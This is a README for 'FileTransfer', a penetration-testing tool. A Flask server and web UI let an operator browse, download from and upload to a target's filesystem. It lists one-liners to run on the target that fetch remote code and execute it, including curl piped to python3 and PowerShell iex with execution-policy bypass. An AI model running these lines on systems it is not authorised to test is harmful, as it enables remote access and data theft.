# FileTransfer

Seamless file transfer tool for penetration testing.
Run the server on your machine, drop a one-liner on the target — done.

## Quick start

```bash
# Install the only dependency
pip install flask

# Start the server (auto-detects your IP)
python3 server.py

# With a specific port or IP
python3 server.py -p 9999 --ip 10.10.14.5
```

Open the WebUI at `http://localhost:8888` (or the printed URL).
Copy the one-liner for the target OS, run it on the target machine.

## One-liners (auto-displayed by the server)

| Target OS | Command |
|-----------|---------|
| Linux / macOS | `curl -s http://IP:PORT/client.py \| python3` |
| Windows (Python) | `python -c "import urllib.request;exec(urllib.request.urlopen('http://IP:PORT/client.py').read().decode())"` |
| Windows (PS only) | `powershell -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('http://IP:PORT/client.ps1')"` |

## Features

- **WebUI** — browse target filesystem, click folders to navigate
- **GET** — download any file from the target to your machine
- **PUT** — upload files via the Upload button or drag-and-drop
- **Multi-target** — manage several connected clients simultaneously
- **Auto-reconnect** — client retries on connection loss
- **Cross-platform** — Python client works on Linux/macOS/Windows; PS client for Windows without Python

## Files

| File | Purpose |
|------|---------|
| `server.py` | Server + WebUI (run this) |
| `client.py` | Python client (served dynamically, URL auto-injected) |
| `client.ps1` | PowerShell client (served dynamically, URL auto-injected) |

## Requirements

- **Server (your machine):** Python 3.6+, Flask (`pip install flask`)
- **Client (target):** Python 3.6+ *or* PowerShell 3+ (no pip needed)
